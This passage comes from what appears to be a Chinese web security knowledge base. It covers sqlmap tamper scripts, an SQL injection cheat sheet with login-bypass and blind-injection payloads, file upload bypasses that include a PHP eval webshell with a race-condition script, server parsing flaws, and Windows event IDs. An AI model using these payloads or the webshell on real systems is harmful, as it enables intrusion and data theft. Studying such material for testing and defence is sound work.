Unicode 字符替换单引号\n使用脚本前：tamper(\u0026quot;1 AND '1'='1\u0026quot;)\n使用脚本后：1 AND %00%271%00%27=%00%271\nappendnullbyte.py # 适用数据库：ALL\n作用：在有效载荷的结束位置加载 null 字节字符编码\n使用脚本前：tamper('1 AND 1=1')\n使用脚本后：1 AND 1=1%00\nchardoubleencode.py # 适用数据库：ALL\n作用：对给定的 payload 全部字符使用双重 url 编码（不处理已经编码的字符）\n使用脚本前：tamper('SELECT FIELD FROM%20TABLE')\n使用脚本后：%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545\nRAW # Tamper Description apostrophemask.py Replaces apostrophe character with its UTF-8 full width counterpart apostrophenullencode.py Replaces apostrophe character with its illegal double unicode counterpart appendnullbyte.py Appends encoded NULL byte character at the end of payload base64encode.py Base64 all characters in a given payload between.py Replaces greater than operator (\u0026rsquo;\u0026gt;\u0026rsquo;) with \u0026lsquo;NOT BETWEEN 0 AND #\u0026rsquo; bluecoat.py Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator chardoubleencode.py Double url-encodes all characters in a given payload (not processing already encoded) commalesslimit.py Replaces instances like \u0026lsquo;LIMIT M, N\u0026rsquo; with \u0026lsquo;LIMIT N OFFSET M\u0026rsquo; commalessmid.py Replaces instances like \u0026lsquo;MID(A, B, C)\u0026rsquo; with \u0026lsquo;MID(A FROM B FOR C)\u0026rsquo; concat2concatws.py Replaces instances like \u0026lsquo;CONCAT(A, B)\u0026rsquo; with \u0026lsquo;CONCAT_WS(MID(CHAR(0), 0, 0), A, B)\u0026rsquo; charencode.py Url-encodes all characters in a given payload (not processing already encoded) charunicodeencode.py Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded) equaltolike.py Replaces all occurances of operator equal (\u0026rsquo;=\u0026rsquo;) with operator \u0026lsquo;LIKE\u0026rsquo; escapequotes.py Slash escape quotes (\u0026rsquo; and \u0026ldquo;) greatest.py Replaces greater than operator (\u0026rsquo;\u0026gt;\u0026rsquo;) with \u0026lsquo;GREATEST\u0026rsquo; counterpart halfversionedmorekeywords.py Adds versioned MySQL comment before each keyword ifnull2ifisnull.py Replaces instances like \u0026lsquo;IFNULL(A, B)\u0026rsquo; with \u0026lsquo;IF(ISNULL(A), B, A)\u0026rsquo; modsecurityversioned.py Embraces complete query with versioned comment modsecurityzeroversioned.py Embraces complete query with zero-versioned comment multiplespaces.py Adds multiple spaces around SQL keywords nonrecursivereplacement.py Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace(\u0026ldquo;SELECT\u0026rdquo;, \u0026ldquo;\u0026rdquo;)) filters percentage.py Adds a percentage sign (\u0026rsquo;%\u0026rsquo;) infront of each character overlongutf8.py Converts all characters in a given payload (not processing already encoded) randomcase.py Replaces each keyword character with random case value randomcomments.py Add random comments to SQL keywords securesphere.py Appends special crafted string sp_password.py Appends \u0026lsquo;sp_password\u0026rsquo; to the end of the payload for automatic obfuscation from DBMS logs space2comment.py Replaces space character (\u0026rsquo; \u0026lsquo;) with comments space2dash.py Replaces space character (\u0026rsquo; \u0026lsquo;) with a dash comment (\u0026rsquo;\u0026ndash;\u0026rsquo;) followed by a random string and a new line (\u0026rsquo;\\n\u0026rsquo;) space2hash.py Replaces space character (\u0026rsquo; \u0026lsquo;) with a pound character (\u0026rsquo;#\u0026rsquo;) followed by a random string and a new line (\u0026rsquo;\\n\u0026rsquo;) space2morehash.py Replaces space character (\u0026rsquo; \u0026lsquo;) with a pound character (\u0026rsquo;#\u0026rsquo;) followed by a random string and a new line (\u0026rsquo;\\n\u0026rsquo;) space2mssqlblank.py Replaces space character (\u0026rsquo; \u0026lsquo;) with a random blank character from a valid set of alternate characters space2mssqlhash.py Replaces space character (\u0026rsquo; \u0026lsquo;) with a pound character (\u0026rsquo;#\u0026rsquo;) followed by a new line (\u0026rsquo;\\n\u0026rsquo;) space2mysqlblank.py Replaces space character (\u0026rsquo; \u0026lsquo;) with a random blank character from a valid set of alternate characters space2mysqldash.py Replaces space character (\u0026rsquo; \u0026lsquo;) with a dash comment (\u0026rsquo;\u0026ndash;\u0026rsquo;) followed by a new line (\u0026rsquo;\\n\u0026rsquo;) space2plus.py Replaces space character (\u0026rsquo; \u0026lsquo;) with plus (\u0026rsquo;+\u0026rsquo;) space2randomblank.py Replaces space character (\u0026rsquo; \u0026lsquo;) with a random blank character from a valid set of alternate characters symboliclogical.py Replaces AND and OR logical operators with their symbolic counterparts (\u0026amp;\u0026amp; and unionalltounion.py Replaces UNION ALL SELECT with UNION SELECT unmagicquotes.py Replaces quote character (\u0026rsquo;) with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) uppercase.py Replaces each keyword character with upper case value \u0026lsquo;INSERT\u0026rsquo; varnish.py Append a HTTP header \u0026lsquo;X-originating-IP\u0026rsquo; versionedkeywords.py Encloses each non-function keyword with versioned MySQL comment versionedmorekeywords.py Encloses each keyword with versioned MySQL comment xforwardedfor.py Append a fake HTTP header \u0026lsquo;X-Forwarded-For\u0026rsquo; 内容参考： https://blog.csdn.net/qq_34444097/article/details/82717357 https://github.com/thryb/sqlmap-tamper/blob/master/README.md\n"},{"id":53,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/%E5%90%84%E7%89%88%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%AD%E5%8F%A5/","title":"各版本数据库语句","section":"Docs","content":" SQL 注入 # 简介 # 常见 SQL 版本 # MySQL Oracle SQL Server PostgreSQL DB2 SQLite 常用常量 # MySQL # 常用函数 # 字符串函数 # database()：显示当前数据库 user()：显示当前用户 version()：显示数据库版本 @@version_compile_os：显示操作系统版本 @@version_compile_machine：显示操作系统位数 @@datadir：显示数据库文件存放路径 @@basedir：显示数据库安装路径 @@hostname：显示数据库主机名 @@port：显示数据库端口 功能函数 # GROUP_CONCAT(name)：将多个值拼接成字符串 concat(a,b)：将 a 和 b 拼接成字符串 substr(str,pos,len)：截取字符串 mid(str,pos,len)：截取字符串 left(str,len)：截取字符串 right(str,len)：截取字符串 ascii(str)：返回字符串第一个字符的 ASCII 码 sleep(5)：让数据库等待 5 秒 updatexml(xml_doument,XPath_string,new_value)：更新 XML 内容 extractvalue(xml_doument,XPath_string)：提取 XML 内容 information_schema 库 # SCHEMATA 表 # 字段：SCHEMA_NAME\n-- 获取当前数据库所有库名 SELECT SCHEMA_NAME FROM information_schema.SCHEMATA; TABLES 表 # 字段：TABLE_NAME（表名），TABLE_SCHEMA（表对应的库名）\n-- 获取某个库的所有表名 SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = \u0026#39;xxx\u0026#39;; COLUMNS 表 # 字段：TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, COLUMN_TYPE\n-- 获取某个表的所有列名 SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME = \u0026#39;xxx\u0026#39;; Oracle # 常用函数 # 字符串函数 # user：显示当前用户 sysdate：显示当前时间 version：显示数据库版本\n功能函数 # ascii(str)：返回字符串第一个字符的 ASCII 码 chr(num)：返回 ASCII 码对应的字符 substr(str,pos,len)：截取字符串 dbms_pipe.receive_message((\u0026lsquo;a\u0026rsquo;),5)：让数据库等待 5 秒 dbms_lock.sleep(5)：让数据库等待 5 秒 ALL_USERS 表 # USERNAME：用户名（相当于模式名） ACCOUNT_STATUS：账户状态\n-- 获取当前数据库所有用户（模式） SELECT USERNAME FROM ALL_USERS; Notes 在 Oracle 数据库中，每个模式相当于一个独立的数据库用户，可以包含表、视图、函数、存储过程等数据库对象。请注意，这里使用的是 all_users 视图，它包含了所有的数据库用户，即模式的列表。\nALL_TABLES 表 # OWNER：表所属用户 TABLE_NAME：表名 TABLESPACE_NAME：表空间名\n-- 获取某个用户的所有表名 SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER = \u0026#39;xxx\u0026#39;; ALL_TAB_COLUMNS 表 # OWNER：表所属用户 TABLE_NAME：表名 COLUMN_NAME：列名\n-- 获取某个表的所有列名 SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = \u0026#39;xxx\u0026#39;; PostgreSQL # 常用函数 # 字符串函数 # current_database()：显示当前数据库 user：显示当前用户 version()：显示数据库版本 功能函数 # ascii(str)：返回字符串第一个字符的 ASCII 码 chr(num)：返回 ASCII 码对应的字符 substr(str,pos,len)：截取字符串 string_agg(name,\u0026rsquo;,\u0026rsquo;)：将多个值拼接成字符串 pg_sleep(5)：让数据库等待 5 秒 information_schema 库 # 同 MySQL\nSELECT table_name FROM information_schema.tables WHERE table_schema = \u0026#39;your_schema_name\u0026#39;; -- 时间盲注语法 select case when (ascii(substr((\u0026lt;查询语句\u0026gt;),{i},1))\u0026gt;{mid}) then pg_sleep({sleepTime}) else pg_sleep(0) end DB2 # 常用函数 # 字符串函数 # current server：显示当前数据库 current user：显示当前用户 version()：显示数据库版本 功能函数 # ascii(str)：返回字符串第一个字符的 ASCII 码 chr(num)：返回 ASCII 码对应的字符 substr(str,pos,len)：截取字符串 sleep(5)：让数据库等待 5 秒 syscat.tables 表 # tabschema：表所属用户 tabname：表名 owner：表所有者 type：表类型 remarks：表备注\n-- 获取某个用户的所有表名 SELECT tabname FROM syscat.tables WHERE tabschema = \u0026#39;xxx\u0026#39;; syscat.columns 表 # tabschema：表所属用户 tabname：表名 colname：列名 typename：列类型 length：列长度 scale：列精度\n-- 获取某个表的所有列名 SELECT colname FROM syscat.columns WHERE tabname = \u0026#39;xxx\u0026#39;; SQL Server # 常用函数 # 字符串函数 # db_name()：显示当前数据库 user_name()：显示当前用户 @@servername：显示数据库主机名 @@version：显示数据库版本 @@spid：显示当前连接 ID @@dbid：显示当前数据库 ID @@language：显示数据库语言\n功能函数 # ascii(str)：返回字符串第一个字符的 ASCII 码 char(num)：返回 ASCII 码对应的字符 substring(str,pos,len)：截取字符串 waitfor delay \u0026lsquo;0:0:5\u0026rsquo;：让数据库等待 5 秒 IF(1=1,waitfor delay \u0026lsquo;0:0:5\u0026rsquo;,1)：如果 1=1，则让数据库等待 5 秒，否则返回 1\nsys.schemas # name：模式名 schema_id：模式 ID -- 获取当前数据库所有模式 SELECT name FROM sys.schemas; sys.tables # name：表名 object_id：表的对象标识符 schema_id：表所属模式 ID -- 获取某个模式的所有表名 SELECT name FROM sys.tables WHERE schema_id = (SELECT schema_id FROM sys.schemas WHERE name = \u0026#39;xxx\u0026#39;); sys.columns # name：列名 object_id：列所属表的对象标识符 -- 获取某个表的所有列名 SELECT name FROM sys.columns WHERE object_id = (SELECT object_id FROM sys.tables WHERE name = \u0026#39;xxx\u0026#39;); SQLite # 常用函数 # 字符串函数 # sqlite_version()：显示数据库版本 sqlite_source_id()：显示数据库源码 ID sqlite_user_version()：显示数据库用户版本 功能函数 # ascii(str)：返回字符串第一个字符的 ASCII 码 char(num)：返回 ASCII 码对应的字符 substr(str,pos,len)：截取字符串 sleep(5)：让数据库等待 5 秒 sqlite_master 表 # type：对象类型 name：对象名 tbl_name：表名 sql：建表语句 -- 获取当前数据库所有表名 SELECT name FROM sqlite_master WHERE type = \u0026#39;table\u0026#39;; -- 获取某个表的所有列名 SELECT sql FROM sqlite_master WHERE type = \u0026#39;table\u0026#39; AND name = \u0026#39;xxx\u0026#39;; 基本流程 # 判断是否存在注入点 必要条件：用户输入的内容可以成为 SQL 语句的一部分 可能存在的注入点：GET/POST/COOKIE/HTTP 头/Referer/Server 等 判断注入类型 联合查询注入：在一条语句中执行多条语句 布尔型注入：根据页面返回的结果判断是否存在注入 报错注入：根据页面返回的错误信息判断是否存在注入 堆叠注入：在一条语句中执行多条语句 盲注：根据页面返回的结果判断是否存在注入 获取信息 库名-\u0026gt;表名-\u0026gt;列名-\u0026gt;SELECT \u0026lt;列名\u0026gt; FROM \u0026lt;表名\u0026gt; 万能密码 # admin' -- admin' # admin'/* ' or 1=1-- ' or 1=1# ' or 1=1/* ') or '1'='1-- ') or ('1'='1-- 以不同的用户登陆 ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1-- 注入类型 # 联合注入 # 语法结构 # \u0026lt;原语句\u0026gt; UNION SELECT \u0026lt;列名\u0026gt; FROM \u0026lt;表名\u0026gt;\nNotes\n\u0026ldquo;\u0026lt;原语句\u0026gt;\u0026ldquo;表示\u0026quot;SELECT \u0026lt;列名\u0026gt; FROM \u0026lt;表名\u0026gt; WHERE \u0026lt;条件\u0026gt;\u0026quot;，下同 Notes\n联合查询的两个表的列数必须相同（通过 order by 来判断） 堆叠注入 # 语法结构 # \u0026lt;原语句\u0026gt;; \u0026lt;SQL 语句\u0026gt;\n报错注入 # 可见报错 # Notes\n当 SQL 语句执行错误，页面出现报错详细内容时，可以通过报错信息来获取数据库信息 语法结构 # \u0026lt;原语句\u0026gt; AND CAST((\u0026lt;查询语句\u0026gt;) AS int)=1\nNotes\nCAST 函数：将查询结果转换为 int 类型 当 CAST 的返回值是文本时，会报错并抛出内容 AND CAST((SELECT xxx FROM xxx) AS int)=1-- updatexml # updatexml(xml_doument,XPath_string,new_value)\nNotes\n第一个参数：XML 的内容\n第二个参数：是需要 update 的位置 XPATH 路径\n第三个参数：是更新后的内容\n所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合 XPATH 格式\n加上“~”就可以让 XPATH 校验失败\n如：admin\u0026rsquo; or updatexml(1,concat(0x7e,database()),0)#\nextractvalue # 布尔盲注 # 条件响应盲注 # 当 SQL 语句执行正确时，页面出现某些内容，而错误时不显示该内容，可以进行布尔盲注 \u0026lt;原语句\u0026gt; AND \u0026lt;条件\u0026gt; 条件错误盲注 # 当 SQL 语句执行错误时，页面出现报错（没有详细内容），可以进行布尔盲注 -- MySQL \u0026lt;原语句\u0026gt; AND (SELECT CASE WHEN (\u0026lt;条件\u0026gt;) THEN 1/0 ELSE \u0026#39;\u0026#39; END) -- Oracle \u0026lt;原语句\u0026gt; AND (SELECT CASE WHEN (\u0026lt;条件\u0026gt;) THEN TO_CHAR(1/0) ELSE \u0026#39;\u0026#39; END FROM dual) -- PostgreSQL \u0026lt;原语句\u0026gt; AND (SELECT CASE WHEN (\u0026lt;条件\u0026gt;) THEN cast(1/0 as text) ELSE \u0026#39;\u0026#39; END) 条件为真时，执行 1/0，报错（除数不能为 0） 时间盲注 # 基本语法 # -- MySQL \u0026lt;原语句\u0026gt; AND SLEEP(5) \u0026lt;原语句\u0026gt; AND if(1=2,1,SLEEP (5)) -- PostgreSQL \u0026lt;原语句\u0026gt;||pg_sleep(\u0026lt;时间\u0026gt;) \u0026lt;原语句\u0026gt;||IF(1=2,1,pg_sleep(\u0026lt;时间\u0026gt;)) \u0026lt;原语句\u0026gt;;/*%3B*/SELECT+CASE+WHEN+(\u0026lt;条件\u0026gt;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END -- Oracle \u0026lt;原语句\u0026gt; AND dbms_pipe.receive_message((\u0026#39;a\u0026#39;),5) -- SQL Server \u0026lt;原语句\u0026gt; AND WAITFOR DELAY \u0026#39;0:0:5\u0026#39; 附：盲注中判断数据库类型 # -- MySQL ASCII(SUBSTRING(@@version, 1, 1)) = 77 -- Oracle (SELECT COUNT(*) FROM v$version WHERE banner LIKE \u0026#39;%Oracle%\u0026#39;) \u0026gt; 0 (SELECT \u0026#39;1\u0026#39; FROM dual) = \u0026#39;1\u0026#39; -- PostgreSQL (SELECT COUNT(*) FROM pg_stat_activity) \u0026gt; 0 -- SQL Server (SELECT COUNT(*) FROM sys.databases WHERE name = \u0026#39;master\u0026#39;) \u0026gt; 0 -- SQLite (SELECT COUNT(*) FROM sqlite_master WHERE type = \u0026#39;table\u0026#39;) \u0026gt; 0 -- DB2 (SELECT COUNT(*) FROM sysibm.sysdummy1) \u0026gt; 0 常见问题 # 有时存在查询语句长度限制（Unterminated string literal：未终结的字符串） 绕过技巧 # 被过滤内容 替代 空格 /**/ 或者 () = like substring/mid right 或者 left 绕过 union，select，where 等 # 使用注释符绕过 # 常用注释符：\n//，\u0026ndash; , /**/, #, \u0026ndash;+, \u0026ndash; -, ;,%00,\u0026ndash;a\n用法：\nU/**/NION/**/SE/**/LECT/**/user，pwd from user\n使用大小写绕过 # id=-1'UnIoN/**/SeLeCT\n内联注释绕过 # id=-1'/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#\n双关键字绕过 # id=-1'UNIunionONSeLselectECT1,2,3–-\n"},{"id":54,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/HTTP_content-type_%E5%AF%B9%E7%85%A7%E8%A1%A8/","title":"HTTP Content Type 对照表","section":"Docs","content":" 常见Content-Type对照表 # 文件后缀 Mime类型 说明 .flv flv/flv-flash 在线播放 .html或.htm text/html 超文本标记语言文本 .rtf application/rtf RTF文本 .gif 或.png image/gif(image/png) GIF图形/PNG图片 .jpeg或.jpg image/jpeg JPEG图形 .au audio/basic au声音文件 .mid或.midi audio/midi或audio/x-midi MIDI音乐文件 .ra或.ram或.rm audio/x-pn-realaudio RealAudio音乐文件 .mpg或.mpeg或.mp3 video/mpeg MPEG文件 .avi video/x-msvideo AVI文件 .gz application/x-gzip GZIP文件 .tar application/x-tar TAR文件 .exe application/octet-stream 下载文件类型 .rmvb video/vnd.rn-realvideo 在线播放 .txt text/plain 普通文本 .mrp application/octet-stream MRP文件（国内普遍的手机） .ipa application/iphone-package-archive IPA文件(IPHONE) .deb application/x-debian-package-archive DED文件(IPHONE) .apk application/vnd.android.package-archive APK文件(安卓系统) .cab application/vnd.cab-com-archive CAB文件(Windows Mobile) .xap application/x-silverlight-app XAP文件(Windows Phone 7) .sis application/vnd.symbian.install-archive SIS文件(symbian平台) .jar application/java-archive JAR文件(JAVA平台手机通用格式) .jad text/vnd.sun.j2me.app-descriptor JAD文件(JAVA平台手机通用格式) .sisx application/vnd.symbian.epoc/x-sisx-app SISX文件(symbian平台) "},{"id":55,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","title":"文件上传","section":"Docs","content":" 文件上传漏洞 # 文件上传漏洞是指用户上传了一个可执行脚本文件，并通过此文件获得了执行服务器端命令的能力。在大多数情况下，文件上传漏洞一般是指上传 WEB 脚本能够被服务器解析的问题，也就是所谓的 webshell 问题。完成这一攻击需要这样几个条件，一是上传的文件能够被 WEB 容器执行，其次用户能从 WEB 上访问这个文件，最后，如果上传的文件被安全检查、格式化、图片压缩等功能改变了内容，则可能导致攻击失败。\n前端检查 # 控制台重构检查函数 抓包 文件后缀绕过 # 改为php5,php4,php3,php2,phtml,pht 大小写绕过 加空格 加点 加::$DATA 加点+空格+点+空格（deldot()删除末尾空格、trim()首尾去空） 双写 上传路径可控 # 上传路径+文件名拼接时，上传路径后输入保存文件名并使用 00 截断，GET：%00 截断，POST：00 截断（需要php版本小于 5.3.4，php.ini的magic_quotes_gpc为OFF状态）\nContent-Type 绕过 # 抓包修改 Content-Type\n见HTTP_content-type_对照表\n文件头检测 # 添加文件头（GIF89a 等）\n文件内容检测 # 参考PHP命令执行\n二次渲染 # 测试图片的渲染后没有修改的位置，将一句话木马添加进去，这样就可以利用文件包含去执行 php 一句话木马了\n对于 GIF 的上传，只需要判断没有修改的位置，然后将 php 一句话木马添加即可\n对于 PNG 的上传，需要修改 PLTE 数据块或者修改 IDAT 数据块\n详见 制作绕过二次渲染的图片马\n条件竞争 # 针对上传后检测再删除的情况，可用传一个创建一个一句话木马的文件，然后不断访问，直到执行成功。\n// upload \u0026lt;?php $file=fopen(\u0026#34;muma.php\u0026#34;,\u0026#34;w\u0026#34;); $string=\u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;test\u0026#34;]); ?\u0026gt;\u0026#39;; fwrite($file,$string); fcolse(); ?\u0026gt; # run import requests for i in range(1000000): url=\u0026#34;xxx\u0026#34; if requests.get(url).status_code == 200 : print(\u0026#39;yse\u0026#39;) break 解析漏洞 # Apache 解析漏洞 # 在Apache1.x和2.x版本中，Apache可以识别多个文件扩展名。如果文件存在多个扩展名，Apache会从后向前开始解析，如果遇到Apache配置文件中的mime.types没有定义的扩展名，就继续向前解析，直到识别出可以解析的扩展名；如果所有扩展名都无法解析，就会以DeafultType的默认值text/plain将该文件当作文本解析。\n例如：file.php.en, file.php.rar, file.php.gif当作PHP文件来解析\nISS 解析漏洞 # IIS6.0在处理有分号;的文件名时，会截断分号后面的部分，造成解析漏洞。\n例如：test.asp;.jpg会被当成ASP文件来解析 IIS6.0目录解析漏洞：当目录的名称是.asp、.asa、.cer和.cdx时，IIS6.0会将目录里任何扩展名的文件都当作ASP文件来执行，造成目录解析漏洞。\n旧版Windows Server中存在空格和dot漏洞类似于 a.php. 和 a.php[空格] 这样的文件名存储后会被windows去掉点和空格，从而使得加上这两个东西可以突破过滤，成功上传，并且被当作php代码来执行\nNginx 解析漏洞 # nginx(0.5.x, 0.6.x, 0.7 \u0026lt;= 0.7.65, 0.8 \u0026lt;= 0.8.37)空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行（fastcgi会把这个文件当php看，不受空字节影响，但是检查文件后缀的那个功能会把空字节后面的东西抛弃，所以识别为jpg）\nPHP CGI 解析漏洞 # PHP的配置文件中有一个参数时cgi.fix_pathinfo，如果设置了cgi.fix_pathinfo=1,则在访问http://www.a.com/path/test.jpg/notexist.php时，PHP会递归向前解析，如果test.jpg存在，就会把test.jpg当作PHP文件解析，IIS7.x和Nginx中间件解析PHP文件时，默认PHP的配置文件都开启了cgi.fix_pathinfo，导致产生解析漏洞。此时 Nginx 的配置如下\nlocation ~ \\.php$ { root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; include fastcgi_param; } "},{"id":56,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1/","title":"日志审计","section":"Docs","content":" 日志审计 # Windows # 常用安全事件 ID # 系统 # 1074，通过这个事件 ID 查看计算机的开机、关机、重启的时间以及原因和注释。\n6005，表示计算机日志服务已启动，如果出现了事件 ID 为 6005，则表示这天正常启动了系统。\n104，这个时间 ID 记录所有审计日志清除事件，当有日志被清除时，出现此事件 ID。\n安全 # 4624，这个事件 ID 表示成功登陆的用户，用来筛选该系统的用户登陆成功情况。\n4625，这个事件 ID 表示登陆失败的用户。\n4720,4722,4723,4724,4725,4726,4738,4740, 事件 ID 表示当用户帐号发生创建，删除，改变密码时的事件记录。\n4727,4737,4739,4762, 事件 ID 表示当用户组发生添加、删除时或组内添加成员时生成该事件。\n安全事件 ID 汇总备查 # EVENT_ID 安全事件信息 1100 ----- 事件记录服务已关闭 1101 ----- 审计事件已被运输中断。 1102 ----- 审核日志已清除 1104 ----- 安全日志现已满 1105 ----- 事件日志自动备份 1108 ----- 事件日志记录服务遇到错误 4608 ----- Windows 正在启动 4609 ----- Windows 正在关闭 4610 ----- 本地安全机构已加载身份验证包 4611 ----- 已向本地安全机构注册了受信任的登录进程 4612 ----- 为审计消息排队分配的内部资源已经用尽，导致一些审计丢失。 4614 ----- 安全帐户管理器已加载通知包。 4615 ----- LPC 端口使用无效 4616 ----- 系统时间已更改。 4618 ----- 已发生受监视的安全事件模式 4621 ----- 管理员从 CrashOnAuditFail 恢复了系统 4622 ----- 本地安全机构已加载安全包。 4624 ----- 帐户已成功登录 4625 ----- 帐户无法登录 4626 ----- 用户/设备声明信息 4627 ----- 集团会员信息。 4634 ----- 帐户已注销 4646 ----- IKE DoS 防护模式已启动 4647 ----- 用户启动了注销 4648 ----- 使用显式凭据尝试登录 4649 ----- 检测到重播攻击 4650 ----- 建立了 IPsec 主模式安全关联 4651 ----- 建立了 IPsec 主模式安全关联 4652 ----- IPsec 主模式协商失败 4653 ----- IPsec 主模式协商失败 4654 ----- IPsec 快速模式协商失败 4655 ----- IPsec 主模式安全关联已结束 4656 ----- 请求了对象的句柄 4657 ----- 注册表值已修改 4658 ----- 对象的句柄已关闭 4659 ----- 请求删除对象的句柄 4660 ----- 对象已删除 4661 ----- 请求了对象的句柄 4662 ----- 对对象执行了操作 4663 ----- 尝试访问对象 4664 ----- 试图创建一个硬链接 4665 ----- 尝试创建应用程序客户端上下文。 4666 ----- 应用程序尝试了一个操作 4667 ----- 应用程序客户端上下文已删除 4668 ----- 应用程序已初始化 4670 ----- 对象的权限已更改 4671 ----- 应用程序试图通过 TBS 访问被阻止的序号 4672 ----- 分配给新登录的特权 4673 ----- 特权服务被召唤 4674 ----- 尝试对特权对象执行操作 4675 ----- SID 被过滤掉了 4688 ----- 已经创建了一个新流程 4689 ----- 一个过程已经退出 4690 ----- 尝试复制对象的句柄 4691 ----- 请求间接访问对象 4692 ----- 尝试备份数据保护主密钥 4693 ----- 尝试恢复数据保护主密钥 4694 ----- 试图保护可审计的受保护数据 4695 ----- 尝试不受保护的可审计受保护数据 4696 ----- 主要令牌已分配给进程 4697 ----- 系统中安装了一项服务 4698 ----- 已创建计划任务 4699 ----- 计划任务已删除 4700 ----- 已启用计划任务 4701 ----- 计划任务已禁用 4702 ----- 计划任务已更新 4703 ----- 令牌权已经调整 4704 ----- 已分配用户权限 4705 ----- 用户权限已被删除 4706 ----- 为域创建了新的信任 4707 ----- 已删除对域的信任 4709 ----- IPsec 服务已启动 4710 ----- IPsec 服务已禁用 4711 ----- PAStore 引擎（1％） 4712 ----- IPsec 服务遇到了潜在的严重故障 4713 ----- Kerberos 策略已更改 4714 ----- 加密数据恢复策略已更改 4715 ----- 对象的审核策略（SACL）已更改 4716 ----- 可信域信息已被修改 4717 ----- 系统安全访问权限已授予帐户 4718 ----- 系统安全访问已从帐户中删除 4719 ----- 系统审核策略已更改 4720 ----- 已创建用户帐户 4722 ----- 用户帐户已启用 4723 ----- 尝试更改帐户的密码 4724 ----- 尝试重置帐户密码 4725 ----- 用户帐户已被禁用 4726 ----- 用户帐户已删除 4727 ----- 已创建启用安全性的全局组 4728 ----- 已将成员添加到启用安全性的全局组中 4729 ----- 成员已从启用安全性的全局组中删除 4730 ----- 已删除启用安全性的全局组 4731 ----- 已创建启用安全性的本地组 4732 ----- 已将成员添加到启用安全性的本地组 4733 ----- 成员已从启用安全性的本地组中删除 4734 ----- 已删除已启用安全性的本地组 4735 ----- 已启用安全性的本地组已更改 4737 ----- 启用安全性的全局组已更改 4738 ----- 用户帐户已更改 4739 ----- 域策略已更改 4740 ----- 用户帐户已被锁定 4741 ----- 已创建计算机帐户 4742 ----- 计算机帐户已更改 4743 ----- 计算机帐户已删除 4744 ----- 已创建禁用安全性的本地组 4745 ----- 已禁用安全性的本地组已更改 4746 ----- 已将成员添加到已禁用安全性的本地组 4747 ----- 已从安全性已禁用的本地组中删除成员 4748 ----- 已删除安全性已禁用的本地组 4749 ----- 已创建一个禁用安全性的全局组 4750 ----- 已禁用安全性的全局组已更改 4751 ----- 已将成员添加到已禁用安全性的全局组中 4752 ----- 成员已从禁用安全性的全局组中删除 4753 ----- 已删除安全性已禁用的全局组 4754 ----- 已创建启用安全性的通用组 4755 ----- 启用安全性的通用组已更改 4756 ----- 已将成员添加到启用安全性的通用组中 4757 ----- 成员已从启用安全性的通用组中删除 4758 ----- 已删除启用安全性的通用组 4759 ----- 创建了一个安全禁用的通用组 4760 ----- 安全性已禁用的通用组已更改 4761 ----- 已将成员添加到已禁用安全性的通用组中 4762 ----- 成员已从禁用安全性的通用组中删除 4763 ----- 已删除安全性已禁用的通用组 4764 ----- 组类型已更改 4765 ----- SID 历史记录已添加到帐户中 4766 ----- 尝试将 SID 历史记录添加到帐户失败 4767 ----- 用户帐户已解锁 4768 ----- 请求了 Kerberos 身份验证票证（TGT） 4769 ----- 请求了 Kerberos 服务票证 4770 ----- 更新了 Kerberos 服务票证 4771 ----- Kerberos 预身份验证失败 4772 ----- Kerberos 身份验证票证请求失败 4773 ----- Kerberos 服务票证请求失败 4774 ----- 已映射帐户以进行登录 4775 ----- 无法映射帐户以进行登录 4776 ----- 域控制器尝试验证帐户的凭据 4777 ----- 域控制器无法验证帐户的凭据 4778 ----- 会话重新连接到 Window Station 4779 ----- 会话已与 Window Station 断开连接 4780 ----- ACL 是在作为管理员组成员的帐户上设置的 4781 ----- 帐户名称已更改 4782 ----- 密码哈希帐户被访问 4783 ----- 创建了一个基本应用程序组 4784 ----- 基本应用程序组已更改 4785 ----- 成员已添加到基本应用程序组 4786 ----- 成员已从基本应用程序组中删除 4787 ----- 非成员已添加到基本应用程序组 4788 ----- 从基本应用程序组中删除了非成员。 4789 ----- 基本应用程序组已删除 4790 ----- 已创建 LDAP 查询组 4791 ----- 基本应用程序组已更改 4792 ----- LDAP 查询组已删除 4793 ----- 密码策略检查 API 已被调用 4794 ----- 尝试设置目录服务还原模式管理员密码 4797 ----- 试图查询帐户是否存在空白密码 4798 ----- 枚举了用户的本地组成员身份。 4799 ----- 已枚举启用安全性的本地组成员身份 4800 ----- 工作站已锁定 4801 ----- 工作站已解锁 4802 ----- 屏幕保护程序被调用 4803 ----- 屏幕保护程序被解雇了 4816 ----- RPC 